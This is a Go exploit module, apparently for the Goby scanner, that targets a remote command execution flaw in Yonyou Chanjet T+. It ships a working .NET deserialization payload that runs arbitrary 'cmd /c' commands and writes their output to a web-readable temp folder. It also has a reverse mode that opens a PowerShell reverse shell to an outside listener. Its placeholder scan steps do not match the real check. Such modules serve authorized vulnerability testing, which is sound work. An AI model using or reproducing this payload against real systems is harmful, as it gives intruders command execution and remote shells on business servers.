package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yonyou Chanjet T+ GetStoreWarehouseByStore Method Remote Command Execution Vulnerability",
    "Description": "<p>Yonyou changjietong T+is a smart, flexible and fashionable enterprise management software based on the The Internet Age.</p><p>Yonyou changjietong T+ has a remote command execution vulnerability, which allows attackers to execute arbitrary commands on the target server.</p>",
    "Product": "Chanjet-TPlus",
    "Homepage": "https://www.chanjet.com/",
    "DisclosureDate": "2023-06-21",
    "PostTime": "2023-07-13",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"><script>location='/tplus/';</script></body>\" || title==\"畅捷通 T+\"",
    "GobyQuery": "body=\"><script>location='/tplus/';</script></body>\" || title==\"畅捷通 T+\"",
    "Level": "3",
    "Impact": "<p>Yonyou changjietong T+ has a remote command execution vulnerability, which allows attackers to execute arbitrary commands on the target server.</p>",
    "Recommendation": "<p>The manufacturer has released a repair patch, please fix it as soon as possible: <a href=\"https://www.chanjetvip.com/product/goods\">https://www.chanjetvip.com/product/goods</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "createSelect",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "用友畅捷通 T+ GetStoreWarehouseByStore 方法远程命令执行漏洞",
            "Product": "畅捷通-TPlus",
            "Description": "<p>用友畅捷通T+ 是一款智慧、灵动、时尚的基于互联网时代的企业管理软件。</p><p>畅捷通T+存在远程命令执行漏洞，攻击者可利用该漏洞在目标服务器上执行任意命令。</p>",
            "Recommendation": "<p>厂商已发布修复补丁，请用户尽快修复：<a href=\"https://www.chanjetvip.com/product/goods\" target=\"_blank\">https://www.chanjetvip.com/product/goods</a></p>",
            "Impact": "<p>畅捷通T+存在远程命令执行漏洞，攻击者可利用该漏洞在目标服务器上执行任意命令。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Yonyou Chanjet T+ GetStoreWarehouseByStore Method Remote Command Execution Vulnerability",
            "Product": "Chanjet-TPlus",
            "Description": "<p>Yonyou changjietong T+is a smart, flexible and fashionable enterprise management software based on the The Internet Age.</p><p>Yonyou changjietong T+ has a remote command execution vulnerability, which allows attackers to execute arbitrary commands on the target server.</p>",
            "Recommendation": "<p>The manufacturer has released a repair patch, please fix it as soon as possible: <a href=\"https://www.chanjetvip.com/product/goods\" target=\"_blank\">https://www.chanjetvip.com/product/goods</a></p>",
            "Impact": "<p>Yonyou changjietong T+ has a remote command execution vulnerability, which allows attackers to execute arbitrary commands on the target server.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10819"
}`
	executeCommand187833619 := func(hostInfo *httpclient.FixUrl, cmd string) string {
		configPost := httpclient.NewPostRequestConfig("/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore")
		configPost.Header.Store("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
		configPost.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		configPost.Header.Store("Content-Type", "text/plain")
		configPost.Header.Store("Accept-Encoding", "gzip, deflate")
		configPost.Header.Store("X-Ajaxpro-Method", "GetStoreWarehouseByStore")
		configPost.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
		configPost.Header.Store("Connection", "close")
		configPost.Header.Store("Content-Length", "540")
		configPost.Data = `{
	"storeID":{
		"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
		"MethodName":"Start",
		"ObjectInstance":{
			"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
			"StartInfo":{
				"__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
				"FileName":"cmd",
				"Arguments":"/c ` + cmd + `"
			}
		}
	}
}`
		resp, err := httpclient.DoHttpRequest(hostInfo, configPost)
		if err != nil {
			return ""
		}
		return resp.Utf8Html
	}

	getCmdShellResult46454687 := func(hostInfo *httpclient.FixUrl, checkFilename string) string {
		resp, err := httpclient.SimpleGet(hostInfo.FixedHostInfo + "/tplus/temp/" + checkFilename)
		if err != nil {
			return ""
		}
		if len(resp.Utf8Html) > 0 && resp.StatusCode == 200 {
			return resp.Utf8Html
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkFilename := goutils.RandomHexString(5) + ".txt"
			checkStr := goutils.RandomHexString(10)
			executeCommand187833619(hostInfo, fmt.Sprintf("mkdir temp & echo %s> .\\\\temp\\\\%s", checkStr, checkFilename))
			time.Sleep(2 * time.Second) // 服务器可能没写入完成，如果直接请求该文件，可能会检测失败，导致漏报，本地环境测试发现该问题
			return strings.Contains(getCmdShellResult46454687(hostInfo, checkFilename), checkStr)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if stepLogs.Params["attackType"].(string) == "cmd" {
				cmd := stepLogs.Params["cmd"].(string)
				checkFilename := goutils.RandomHexString(8) + ".txt"
				executeCommand187833619(expResult.HostInfo, fmt.Sprintf("%s> .\\\\temp\\\\%s", strings.ReplaceAll(cmd, "\\", "\\\\"), checkFilename))
				time.Sleep(2 * time.Second)
				executeResults := getCmdShellResult46454687(expResult.HostInfo, checkFilename)
				if len(executeResults) > 0 {
					expResult.Output = executeResults
					expResult.Success = true
				}
			} else if stepLogs.Params["attackType"].(string) == "reverse" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) == 0 {
					expResult.Output = "godclient bind failed!"
					expResult.Success = false
					return expResult
				} else {
					cmd := godclient.ReverseTCPByPowershell(rp)
					executeCommand187833619(expResult.HostInfo, strings.ReplaceAll(cmd, "\\", "\\\\"))
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 20):
					}
				}
			} else {
				expResult.Output = "未知的利用方式！"
				expResult.Success = false
				return expResult
			}
			return expResult
		},
	))
}
